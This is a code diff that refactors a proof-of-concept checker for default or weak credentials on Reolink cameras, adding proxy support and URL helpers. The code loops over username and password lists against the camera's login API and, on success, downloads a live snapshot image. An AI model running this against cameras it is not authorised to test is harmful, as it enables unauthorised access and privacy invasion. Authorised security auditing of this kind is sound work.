@@ -18,7 +18,8 @@ class ReolinkWeakPassword(POCTemplate):
         self.desc = """Reolink cameras may ship with default credentials (admin/blank)"""
 
     def verify(self, ip, port=80):
-        headers = {'Connection': 'close', 'User-Agent': self.config.user_agent}
+        headers = self._get_headers()
+        proxies = self._get_proxies()
         for user in self.config.users:
             for password in self.config.passwords:
                 try:
@@ -27,11 +28,12 @@ class ReolinkWeakPassword(POCTemplate):
                         "User": {"userName": user, "password": password}
                     }}]
                     r = requests.post(
-                        f"http://{ip}:{port}/cgi-bin/api.cgi?cmd=Login",
+                        self._get_url(ip, port, '/cgi-bin/api.cgi?cmd=Login'),
                         json=login_payload,
                         headers=headers,
                         verify=False,
-                        timeout=self.config.timeout
+                        timeout=self.config.timeout,
+                        proxies=proxies
                     )
                     if r.status_code == 200:
                         data = r.json()
@@ -47,7 +49,7 @@ class ReolinkWeakPassword(POCTemplate):
         ip, port, product, user, password, vul = results
         img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
         # Reolink snapshot endpoint
-        url = f"http://{ip}:{port}/cgi-bin/api.cgi?cmd=Snap&channel=0&rs=snap"
+        url = self._get_url(ip, port, '/cgi-bin/api.cgi?cmd=Snap&channel=0&rs=snap')
         return self._snapshot(url, img_file_name, auth=(user, password))
 
 
